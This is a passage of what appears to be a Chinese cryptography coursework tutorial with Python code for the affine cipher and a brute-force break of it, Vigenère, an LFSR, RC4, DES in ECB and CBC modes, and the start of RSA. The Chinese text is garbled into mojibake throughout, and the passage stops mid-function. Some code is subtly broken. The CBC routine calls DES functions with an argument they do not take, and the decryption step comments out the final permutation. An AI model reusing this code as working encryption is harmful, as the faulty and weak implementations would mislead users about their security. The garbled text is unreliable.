å¯†å‡½æ•°ï¼šY=ï¼ˆAX+Bï¼‰%26 è§£å¯†å‡½æ•°ï¼šY=ï¼ˆAX+Bï¼‰%26ï¼Œå¾—åˆ°ï¼šX=ï¼ˆAçš„é€†å…ƒï¼‰*ï¼ˆY-Bï¼‰%26 åŸç†å¾ˆç®€å•ï¼Œä»£ç å®ç°ä¹Ÿæ¯”è¾ƒç®€å• ä»£ç å®ç°å„ä¸ªå‡½æ•°ä½œç”¨ gcd(a,b) æ±‚a,bçš„æœ€å¤§å…¬å› å­ findModReverse(a,m) è®¡ç®—aæ¨¡mçš„é€†å…ƒ encode(a,b,s) ä»¿å°„åŠ å¯† decode(a,b,s) ä»¿å°„è§£å¯† åˆ©ç”¨æ‰©å±•çš„æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚é€†å…ƒ def gcd(a,b): # æ±‚å‡ºæœ€å¤§å…¬å› æ•° while a!=0: a,b = b%a,a return b def findModReverse(a,m): #æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€† if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m å®Œæ•´ä»£ç å¦‚ä¸‹ def gcd(a,b): # æ±‚å‡ºæœ€å¤§å…¬å› æ•° while a!=0: a,b = b%a,a return b def findModReverse(a,m): #æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€† if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def encode(a,b,s): result = &quot;&quot; # ä¿å­˜åŠ å¯†ç»“æœ s = s.upper() # å…¨éƒ¨è½¬æ¢ä¸ºå¤§å†™ï¼Œæ–¹ä¾¿è®¡ç®— for i in range(0,len(s)): s2 = chr((a*(ord(s[i])-65)+b)%26 + 65) #ä½¿ç”¨åŠ å¯†å…¬å¼ Y=ï¼ˆAX+Bï¼‰%26 result = result +s2 print(result.lower()) def decode(a,b,s): a1 = findModReverse(a,26) result = &quot;&quot; s = s.upper() for i in range(0, len(s)): s2 = chr((a1 * (ord(s[i]) - 65 - b)) % 26 + 65) # ä½¿ç”¨è§£å¯†å…¬å¼X=ï¼ˆAçš„é€†å…ƒï¼‰*ï¼ˆY-Bï¼‰%26 result = result + s2 print(result.lower()) def s_decode(a,b,s): letter =&#x27;abcdefghijklmnopqrstuvwxyz&#x27; letter = letter.upper() s = s.upper() result = &quot;&quot; for i in s: for j in range(0,len(letter)): if i == letter[(a*j+b)%26]: result = result+letter[j] print(result.lower()) def main(): # ä¸»å‡½æ•°å…¥å£ answer = input(f&#x27;è¯·è¾“å…¥æ‰€éœ€çš„æ“ä½œï¼šç¼–ç /E or è§£ç /D: &#x27;) try: if answer.upper() == &#x27;E&#x27;: a = int(input(&#x27;è¯·è¾“å…¥a:&#x27;)) b = int(input(&#x27;è¯·è¾“å…¥b:&#x27;)) s = input(&#x27;è¯·è¾“å…¥éœ€è¦åŠ å¯†çš„å­—ç¬¦:&#x27;) encode(a, b, s) elif answer.upper() == &#x27;D&#x27;: a = int(input(&#x27;è¯·è¾“å…¥a:&#x27;)) b = int(input(&#x27;è¯·è¾“å…¥b:&#x27;)) s = input(&#x27;è¯·è¾“å…¥éœ€è¦è§£å¯†çš„å­—ç¬¦ï¼š&#x27;) decode(a, b, s) # åˆ©ç”¨é€†å…ƒè§£å¯† # s_decode(a,b,s) # æš´åŠ›æšä¸¾æ¯ä¸€ä¸ªå­—ç¬¦ else: print(&#x27;è¾“å…¥é”™è¯¯ï¼&#x27;) except KeyError: print(&#x27;è¯·å‹¿è¾“å…¥ç©ºæ ¼ï¼&#x27;) if __name__ == &#x27;__main__&#x27;: main() # a = 7, b = 22 # plain = firstthesentenceandthentheevidencesaidthequeen # crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj åŠ è§£å¯†ç»“æœå¦‚å›¾æ‰€ç¤º ç ´è§£ä»¿å°„å¯†ç è¿™é‡Œä½¿ç”¨äº†åŠ è§£å¯†ä¸­çš„ gcd findModReverseï¼Œæ‰¾å‡º26ä»¥å†…ä¸”ä¸26äº’ç´ çš„æ‰€æœ‰æ•°çš„é€†å…ƒï¼Œå¹¶å­˜æ”¾åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸­ def findAllre(): # æ‰¾å‡ºæ‰€æœ‰å°äº26ä¸”ä¸26äº’ç´ çš„æ•° re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all å®Œæ•´ä»£ç å¦‚ä¸‹ def gcd(a,b): # æ±‚å‡ºæœ€å¤§å…¬å› æ•° while a!=0: a,b = b%a,a return b def findModReverse(a,m): #æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€† if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def findAllre(): # æ‰¾å‡ºæ‰€æœ‰å°äº26ä¸”ä¸26äº’ç´ çš„æ•° re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all def decode(s): re_all = findAllre() for k1 in re_all: for k2 in range(0, 26): result = &quot;&quot; for i in range(len(s)): s2 = chr(((int(k1) * (ord(s[i]) - 97 - k2)) % 26 + 97)) result = result + s2 print(&quot;k1=&quot; + str(findModReverse(k1,26)) + &quot;, k2=&quot; + str(k2) + &quot; plaintext = &quot; + result) def main(): # criphertext = &#x27;falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj&#x27; criphertext = input(&quot;è¯·è¾“å…¥è¦ç ´è§£çš„å¯†æ–‡: &quot;) criphertext = criphertext.lower() print(&quot;---------&quot;*3+&quot;strat attck&quot;+&quot;---------&quot;*3) decode(criphertext) if __name__ == &#x27;__main__&#x27;: main() æ•ˆæœå¦‚ä¸‹ ç»´å‰å°¼äºšå¯†ç 1.ç®€ä»‹ç»´å‰å°¼äºšå¯†ç ï¼ˆåˆè¯‘ç»´çƒ­çº³å°”å¯†ç ï¼‰æ˜¯ä½¿ç”¨ä¸€ç³»åˆ—å‡¯æ’’å¯†ç ç»„æˆå¯†ç å­—æ¯è¡¨çš„åŠ å¯†ç®—æ³•ï¼Œå±äºå¤šè¡¨å¯†ç çš„ä¸€ç§ç®€å•å½¢å¼ã€‚ ç»´å‰å°¼äºšå¯†ç æ›¾å¤šæ¬¡è¢«å‘æ˜ã€‚è¯¥æ–¹æ³•æœ€æ—©è®°å½•åœ¨å‰å¥¥ä¸‡Â·å·´è’‚æ–¯å¡”Â·è´æ‹‰ç´¢ï¼ˆ Giovan Battista Bellasoï¼‰äº1553å¹´æ‰€è‘—çš„ä¹¦ã€Šå‰å¥¥ä¸‡Â·å·´è’‚æ–¯å¡”Â·è´æ‹‰ç´¢å…ˆç”Ÿçš„å¯†ç ã€‹ï¼ˆæ„å¤§åˆ©è¯­ï¼šLa cifra del. Sig. Giovan Battista Bellasoï¼‰ä¸­ã€‚ç„¶è€Œï¼Œåæ¥åœ¨19ä¸–çºªæ—¶è¢«è¯¯ä¼ ä¸ºæ˜¯æ³•å›½å¤–äº¤å®˜å¸ƒè±æ–¯Â·å¾·Â·ç»´å‰å°¼äºšï¼ˆBlaise De VigenÃ¨reï¼‰æ‰€åˆ›é€ ï¼Œå› æ­¤ç°åœ¨è¢«ç§°ä¸ºâ€œç»´å‰å°¼äºšå¯†ç â€ã€‚ ç»´å‰å°¼äºšå¯†ç ä»¥å…¶ç®€å•æ˜“ç”¨è€Œè‘—ç§°ï¼ŒåŒæ—¶åˆå­¦è€…é€šå¸¸éš¾ä»¥ç ´è§£ï¼Œå› è€Œåˆè¢«ç§°ä¸ºâ€œä¸å¯ç ´è¯‘çš„å¯†ç â€ã€‚è¿™ä¹Ÿè®©å¾ˆå¤šäººä½¿ç”¨ç»´å‰å°¼äºšå¯†ç æ¥åŠ å¯†çš„ç›®çš„å°±æ˜¯ä¸ºäº†å°†å…¶ç ´è§£ã€‚ 2.åŠ è§£å¯†åŸç† åŠ è§£å¯†ä»£ç  # å°†å¯†é’¥å¤„ç†æˆå’Œå¯†æ–‡/æ˜æ–‡ä¸€æ ·é•¿ def solve_key(s,key): nkey = key while len(nkey) &lt; len(s): nkey = nkey+key nkey = nkey[:len(s)] return nkey # åŠ å¯†å‡½æ•° def encode(s,key): print(&#x27;åŠ å¯†åçš„ç»“æœï¼š &#x27;,end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0,len(s)): s2 = chr(abs(((ord(s1[i])-65)+(ord(key1[i])-65)) % 26) + 65) result = result + s2 print(result.lower()) # è§£å¯†å‡½æ•° def decode(s,key): print(&#x27;è§£å¯†åçš„ç»“æœï¼š &#x27;, end=&#x27;&#x27;) s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = &quot;&quot; for i in range(0, len(s)): s2 = chr(((ord(s1[i]) - 65) - (ord(key1[i]) - 65)) % 26 + 65) result = result + s2 print(result.lower()) def main(): while 1: # å‡½æ•°å…¥å£ answer = input(f&#x27;è¯·è¾“å…¥æ‰€éœ€çš„æ“ä½œï¼šç¼–ç /E or è§£ç /D: &#x27;) try: if answer.upper() == &#x27;E&#x27;: key = input(&#x27;è¯·è¾“å…¥å¯†é’¥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;è¯·è¾“å…¥æ˜æ–‡: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) # å°†å­—ç¬¦ä¸²ä¸­çš„éå­—æ¯å­—ç¬¦å»æ‰ # print(s) encode(s, key) elif answer.upper() == &#x27;D&#x27;: key = input(&#x27;è¯·è¾“å…¥å¯†é’¥: &#x27;) key = &quot;&quot;.join(filter(str.isalpha, key)) s = input(&#x27;è¯·è¾“å…¥å¯†æ–‡: &#x27;) s = &quot;&quot;.join(filter(str.isalpha, s)) decode(s, key) else: print(&#x27;è¾“å…¥é”™è¯¯ï¼&#x27;) except KeyError: print(&#x27;è¯·æ£€æŸ¥è¾“å…¥æ˜¯å¦æ­£ç¡®ï¼&#x27;) if __name__ == &#x27;__main__&#x27;: main() äºŒã€åºåˆ—å¯†ç LFSRä»£ç å®ç° def lsrf(inti, top): sum = 0 inti2 = &quot;0&quot;*len(inti) inti2 = list(inti2) inti1 = &#x27;&#x27; for i in range(len(inti)): if top[i] == &quot;1&quot;: sum += int(inti[i]) sum = sum % 2 for i in range(len(inti)): if i == 0: inti2[i] = str(sum) else: inti2[i] = inti[i - 1] inti1 = inti1.join(inti2) return inti1 def main(): inti_str = str(input(&quot;è¯·è¾“å…¥åˆå§‹åŒ–åºåˆ—ï¼š&quot;)) inti_str = inti_str[::-1] inti_str_backup = inti_str top = str(input(&quot;è¯·è¾“å…¥æœ¬åŸå¤šé¡¹å¼ï¼š&quot;)) top = top[::-1] for i in range(2 ** len(inti_str) + 1): if inti_str_backup == inti_str and i != 0 and i == 2 ** len(inti_str) - 1: print(&quot;ç¬¬&#123;0&#125;æ¬¡&quot;.format(i), inti_str_backup) print(&quot;æ˜¯æœ¬åŸå¤šé¡¹å¼ä¸”å‘¨æœŸæ˜¯&quot; + str(i)) break elif inti_str_backup == inti_str and i != 0 and i != 2 ** len(inti_str) - 1: print(&quot;ç¬¬&#123;0&#125;æ¬¡&quot;.format(i), inti_str_backup) print(&quot;ä¸æ˜¯æœ¬åŸå¤šé¡¹å¼ä¸”å‘¨æœŸæ˜¯&quot; + str(i)) break print(&quot;ç¬¬&#123;0&#125;æ¬¡&quot;.format(i), inti_str_backup) inti_str_backup = lsrf(inti_str_backup, top) if __name__ == &#x27;__main__&#x27;: main() é€‰æ‹©æœ¬åŸå¤šé¡¹å¼å’Œåˆå§‹åºåˆ—å¦‚ä¸‹ 100000000001000000 011100010100100101 ç¨‹åºè¿è¡Œç»“æœ RC4å®Œæ•´ä»£ç  import hashlib import base64 # Sç›’åˆå§‹åŒ–ç½®æ¢,Keyä¸ºå¯†é’¥ def Rc4_init(S, Key): j = 0 Key = Key.encode(&#x27;UTF-8&#x27;) Key = hashlib.md5(Key).hexdigest() # é•¿åº¦ä¸º32çš„å­—ç¬¦ä¸² tmp = [] for i in range(256): S.append(i) tmp.append(Key[i % len(Key)]) for i in range(256): j = (j + S[i] + ord(tmp[i])) % 256 S[i], S[j] = S[j], S[i] # äº¤æ¢S[i],S[j] def rc4_Encode(S, plaintext): i = j = 0 result = &#x27;&#x27; for a in plaintext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k result = base64.b64encode(result.encode(&#x27;UTF-8&#x27;)) result = result.decode() return result def rc4_Decode(S, criphtext): i = j = 0 criphtext = base64.b64decode(criphtext) criphtext = str(criphtext.decode()) result = &#x27;&#x27; for a in criphtext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k return result def main(): while 1: order = input(&quot;è¯·è¾“å…¥æŒ‡ä»¤,åŠ å¯†/E,è§£å¯†/D :&quot;) if order.upper() ==&#x27;E&#x27;: plaintext = input(&#x27;è¯·è¾“å…¥æ˜æ–‡: &#x27;) key = input(&quot;è¯·è¾“å…¥å¯†é’¥: &quot;) s = [] Rc4_init(s, key) cryphtext = rc4_Encode(s, plaintext) print(&quot;å¯†æ–‡ä¸º: &quot;, cryphtext) print(&#x27;\\n&#x27;) else: cryphtext = input(&quot;è¯·è¾“å…¥å¯†æ–‡: &quot;) key = input(&quot;è¯·è¾“å…¥å¯†é’¥: &quot;) s = [] Rc4_init(s, key) plaintext = rc4_Decode(s, cryphtext) print(&quot;æ˜æ–‡ä¸º: &quot;, plaintext) print(&#x27;\\n&#x27;) if __name__ == &#x27;__main__&#x27;: main() ä¸‰ã€DESDEC_ECBæ¨¡å¼ # ä¸¤å­—ç¬¦è¿›è¡Œå¼‚æˆ–è¿ç®— def xor(str1, str2): res = &quot;&quot; for i in range(0, len(str1)): xor_res = int(str1[i], 10)^int(str2[i], 10) if xor_res == 1: res += &#x27;1&#x27; else: res += &#x27;0&#x27; return res # å¤„ç†å­—ç¬¦ä¸²ï¼Œå°†æ¯ä¸ªå­—ç¬¦ä¸²éƒ½è½¬æˆå…«ä½äºŒè¿›åˆ¶æ•° def str_process(str): res = &quot;&quot; for i in str: tmp = bin(ord(i))[2:] tmp = (8 - len(tmp)) * &#x27;0&#x27; + tmp # ä¸å¤Ÿå…«ä½åˆ™åœ¨å‰é¢è¡¥ 0 res += tmp return res # PC-1ç›’å¤„ç† def key_change_1(str): change_table = [57,49,41,33,25,17,9,1, 58,50,42,34,26,18,10, 2,59,51,43,35,27,19,11, 3,60,52,44,36,63,55,47, 39,31,23,15,7,62,54,46, 38,30,22,14,6,61,53,45, 37,29,21,13,5,28,20,12,4] res = &quot;&quot; for i in change_table: res += str[i-1] return res # PC-2ç›’å¤„ç† def key_change_2(str): change_table = [14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] res = &quot;&quot; for i in change_table: res += str[i-1] return res # å¾ªç¯å·¦ç§» def left_run(str, num): tmp_str = str[num:len(str)] tmp_str = tmp_str+str[0:num] return tmp_str # ç”Ÿæˆ16ä¸ªå­å¯†é’¥ def key_gen(str): key_list = [] key_change_res = key_change_1(str) key_c = key_change_res[0:28] key_d = key_change_res[28:] num = [0, 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1] for i in range(1, 17): #å…±16è½® key_c = left_run(key_c, num[i]) key_d = left_run(key_d, num[i]) key_yiwei = key_c + key_d key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_list # IPç›’å¤„ç† def begin_change(str): change_table = [58,50,42,34,26,18,10,2, 60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6, 64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1, 59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5, 63,55,47,39,31,23,15,7] res = &quot;&quot; for i in change_table: res += str[i-1] return res # Eç›’å¤„ç† 32ä½-&gt;48ä½ def E_box(str): change_table = [32,1,2,3,4,5,4,5, 6,7,8,9,8,9,10,11, 12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21, 22,23,24,25,24,25,26,27, 28,29,28,29,30,31,32,1] res = &quot;&quot; for i in change_table: res += str[i-1] return res # sç›’å¤„ç† 48ä½-&gt;32ä½ def S_box(str): j = 0 s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11] ] res = &quot;&quot; for i in range(0, len(str), 6): begin_s = str[i:i + 6] row = int(begin_s[0] + begin_s[5], 2) #ç¬¬ä¸€ä½å’Œç¬¬å…­ä½ä½œä¸ºè¡Œ col = int(begin_s[1:5], 2) #ä¸­é—´å››ä½ä½œä¸ºåˆ— index = s_list[j][row * 16 + col] num = bin(index)[2:] #å°†åŒ¹é…çš„æ•°å­—è½¬æ¢ä½äºŒè¿›åˆ¶æ•° for k in range(0, 4 - len(num)): #ä¸å¤Ÿ4ä½åˆ™è¡¥0 num = &quot;0&quot; + num res += num j = j + 1 return res # pç›’å¤„ç† ç½®æ¢æ“ä½œ def P_box(str): res = &quot;&quot; change_table = [16,7,20,21,29,12,28,17, 1,15,23,26,5,18,31,10, 2,8,24,14,32,27,3,9, 19,13,30,6,22,11,4,25] for i in change_table: res += str[i - 1] return res # Få‡½æ•° def F_function(str, key): # R(32ä½)-&gt;Eç›’(48ä½)-&gt;ä¸keyçš„å­å¯†é’¥å¼‚æˆ–-&gt;Sç›’-&gt;Pç½®æ¢ str_e_res = E_box(str) # å°† E å¼‚æˆ– S P é›†åˆåˆ°ä¸€ä¸ªå‡½æ•°ç§ï¼Œä¾¿äºè°ƒç”¨ xor_res = xor(str_e_res, key) str_s_res = S_box(xor_res) str_p_res = P_box(str_s_res) return str_p_res # é€†IPç›’ def IP_re(str): res = &quot;&quot; ip_list = [40,8,48,16,56,24,64,32, 39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30, 37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28, 35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26, 33,1,41,9,49,17,57,25 ] for i in ip_list: res += str[i-1] return res # DESåŠ å¯†æ“ä½œ def DESencode(text, key): text_bin = str_process(text) # å°†å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•° text_IP = begin_change(text_bin) # æ˜æ–‡åˆå§‹ç½®æ¢ key_bin = str_process(key) # å°†å¯†é’¥è½¬æ¢ä½äºŒè¿›åˆ¶æ•° key_list = key_gen(key_bin) # key_lsst æ•°ç»„ä¸­å­˜æ”¾ç€åå…­ä¸ªå­å¯†é’¥ text_left = text_IP[0:32] # R0 text_right = text_IP[32:] # L0 for i in range(0, 15): # åäº”è½®åŠ å¯† mes_tmp = text_right # ä¸´æ—¶å˜é‡ç”¨äºå·¦å³ä¸¤éƒ¨åˆ†äº¤æ¢ text_right = xor(F_function(text_right, key_list[i]) , text_left) #F å‡½æ•°çš„ä½œç”¨ R(32ä½)-&gt;Eç›’(48ä½)-&gt;ä¸keyçš„å­å¯†é’¥å¼‚æˆ–(32ä½)-&gt;Sç›’(32ä½)-&gt;Pç½®æ¢(32ä½) text_left = mes_tmp fin_right = text_right # ç¬¬åå…­è½®åŠ å¯† fin_left = xor(F_function(text_right, key_list[15]), text_left) criph_text = fin_left + fin_right criph_text = IP_re(criph_text) # IPé€†ç½®æ¢ return criph_text # é’ˆå¯¹ä¸€ç»„çš„è§£å¯†ç¨‹åº def DESdecode(text, key): #å¯†æ–‡ç›´æ¥è¾“64ä½2è¿›åˆ¶ key_bin = str_process(key) # å°†å¯†é’¥è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•° key_list = key_gen(key_bin) # ç”Ÿæˆçš„åå…­ä¸ªå­å¯†é’¥ text = begin_change(text) # å…ˆåˆå§‹å€¼æ¢ ä¸åŠ å¯†è¿‡ç¨‹ç›¸å cipher_left = text[0:32] # R16 cipher_right = text[32:] # L16 i = 15 while i &gt; 0: # åäº”è½®åŠ å¯† åè¿‡æ¥ cipher_tmp = cipher_right #è®¾ç½®ä¸€ä¸ªä¸´æ—¶å˜é‡ç”¨äºåé¢çš„äº¤æ¢ cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i])) # F å‡½æ•°çš„ä½œç”¨ R(32ä½)-&gt;Eç›’(48ä½)-&gt;ä¸keyçš„å­å¯†é’¥å¼‚æˆ–(32ä½)-&gt;Sç›’(32ä½)-&gt;Pç½®æ¢(32ä½) # F å‡½æ•°å¤„ç†å®Œåä¸L(32ä½)å¼‚æˆ– cipher_left = cipher_tmp # å·¦å³äº¤æ¢å®Œæˆ i = i - 1 left_text = xor(cipher_left, F_function(cipher_right, key_list[0])) # ä¸€ right_text = cipher_right # äºŒ ä¸‰ è¿™ä¸‰æ­¥æ˜¯ç¬¬åå…­è½®åŠ å¯† plain_bin = left_text + right_text # plain_bin = IP_re(plain_bin) # plain_text = &quot;&quot; for i in range(0, len(plain_bin), 8): plain_text += chr(int(plain_bin[i:i + 8], 2)) return plain_text def Divide_text(order,text,key): # å°†æ˜æ–‡æˆ–è€…æ˜æ–‡åˆ†ç»„ æ˜æ–‡åˆ†æˆ8ä¸ªå­—ç¬¦ä¸€ç»„ï¼Œå¯†æ–‡åˆ™åˆ†æˆ64bitä¸€ç»„ block_text = [] res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # æœ€åä¸€ç»„æ˜æ–‡å¦‚æœä¸å¤Ÿå…«ä¸ªå­—ç¬¦åˆ™æ·»åŠ  + è¡¥é½å…«ä¸ª å¦åˆ™ç¨‹åºä¼šæŠ¥é”™ block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for text in block_text: # åˆ†åˆ«å¯¹æ¯ç»„åŠ å¯† res += DESencode(text, key) else: for text in block_text: # å¯¹å¯†æ–‡è§£å¯† res += DESdecode(text, key) return res def main(): while 1: plaintext = &#x27;&#x27; ciphertext = &#x27;&#x27; key = &#x27;&#x27; order = input(&quot;åŠ å¯†è¯·æŒ‰E,è§£å¯†è¯·æŒ‰D:&quot;) if order == &#x27;E&#x27;: plaintext = input(&quot;è¯·è¾“å…¥æ˜æ–‡ï¼š&quot;) key = input(&quot;è¯·è¾“å…¥å¯†é’¥ï¼š&quot;) ciphertext = Divide_text(order, plaintext, key) print(&quot;å¯†æ–‡æ˜¯ï¼š&quot;) print(ciphertext) else: ciphertext = input(&quot;è¯·è¾“å…¥å¯†æ–‡ï¼š&quot;) key = input(&quot;è¯·è¾“å…¥å¯†é’¥ï¼š&quot;) plaintext = Divide_text(order, ciphertext, key) print(&quot;æ˜æ–‡æ˜¯ï¼š&quot;) print(plaintext) if __name__ == &#x27;__main__&#x27;: main() DES_CBCæ¨¡å¼ åªéœ€è¦ä¿®æ”¹ECBæ¨¡å¼ä¸­çš„ Divide_text éƒ¨åˆ† def Divide_text(order,text,key): # å°†æ˜æ–‡æˆ–è€…æ˜æ–‡åˆ†ç»„ æ˜æ–‡åˆ†æˆ8ä¸ªå­—ç¬¦ä¸€ç»„ï¼Œå¯†æ–‡åˆ™åˆ†æˆ64bitä¸€ç»„ block_text = [] IV = &#x27;aaaaaaaa&#x27; # åˆå§‹åŒ–å‘é‡ IV_bin = str_process(IV) res = &quot;&quot; length = 0 if order == &quot;E&quot;: length = 8 else: length = 64 i = 0 while text[i:i+length] != &quot;&quot;: block_text.append(text[i:i+length]) i += length tmp = &quot;&quot; # åŠ å¯† if order == &#x27;E&#x27;: if len(block_text[-1]) != 8: # æœ€åä¸€ç»„æ˜æ–‡å¦‚æœä¸å¤Ÿå…«ä¸ªå­—ç¬¦åˆ™æ·»åŠ  + è¡¥é½å…«ä¸ª å¦åˆ™ç¨‹åºä¼šæŠ¥é”™ block_text[-1] = block_text[-1] + &#x27;+&#x27; * (8 - len(block_text[-1])) for i in range(len(block_text)): # åˆ†åˆ«å¯¹æ¯ç»„åŠ å¯† if i == 0 : tmp = DESencode(block_text[i],key, IV_bin) res += tmp else: tmp = DESencode(block_text[i],key,tmp) res += tmp # è§£å¯† else: for i in range(len(block_text)): if i == 0: tmp = block_text[i] res += DESdecode(block_text[i], key, IV_bin) else: res += DESdecode(block_text[i], key, tmp) tmp = block_text[i] return res å››ã€RSA# -*- coding = utf - 8 -*- #@Time : 2020/12/23 14:24 #@Author : sunzy #@File : rsa.py from Crypto.Util.number import * import random # æ¨¡é‡å¤å¹³æ–¹æ³• def fast_mod(p,q,n): # pä¸ºåº•æ•°ï¼Œpä¸ºæŒ‡æ•° res = 1 while q: if q &amp; 1: res = (res * p) % n q &gt;&gt;= 1 # å³ç§»1ä½ p = (p * p) % n return res # è®¡ç®—å‡ºd #è¿™ä¸ªæ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡é€†,ç”¨äºæ±‚d def caculateD(a, m): u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m # å°†å­—ç¬¦è½¬åŒ–ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸² def str2Hex(m): return &quot;&quot;.join(&quot;&#123;:02x&#125;&quot;.format(ord(x)) for x in m) # ç´ æ€§æ£€éªŒï¼šé‡‡ç”¨ Miler-Rabin æ£€éªŒæ³• # æ‰€æœ‰çš„ğ‘Ÿ âˆˆ [0, ğ‘  âˆ’ 1]ï¼Œè‹¥ğ‘^ğ‘‘ â‰  1(ğ‘šğ‘œğ‘‘ ğ‘›)ä¸”ğ‘^((2^ğ‘Ÿ)*ğ‘‘) â‰  âˆ’1(ğ‘šğ‘œğ‘‘ ğ‘›)ï¼Œåˆ™ğ‘›æ˜¯åˆæ•°ã€‚å¦åˆ™ï¼Œğ‘›æœ‰ 3/4çš„æ¦‚ç‡ä¸ºç´ æ•° def miller_rabin(n): s = n - 1 t = 0 while s % 2 == 0: # n,s,tä¹‹é—´çš„å…³ç³»ä¸º n = 2^s * t s = s // 2 t += 1 for trials in range(10): # å¯ä»¥å¤šå¢åŠ å‡ è½®ä¿è¯å¤§æ¦‚ç‡ä¸ºç´ æ•° a = random.randrange(2, n - 1) # éšæœºç”Ÿæˆa v = pow(a, s, n) # éªŒè¯ a^(n-1) mod n if v != 1: i = 0 while v != (n - 1): if i == t - 1: return False else: i = i + 1 v = (v ** 2) % n return True # ç”Ÿæˆç´ æ•° å…ˆç”Ÿæˆ1024ä½çš„å¥‡æ•°ï¼Œå†è¿›è¡Œç´ æ€§æ£€éªŒï¼Œé€šè¿‡åˆ™ç”Ÿæˆè¯¥ç´ æ•° def genPrime(b=1024): while True: # è®¾ç½®æ­»å¾ªç¯ç›´åˆ°ç”Ÿæˆç´ 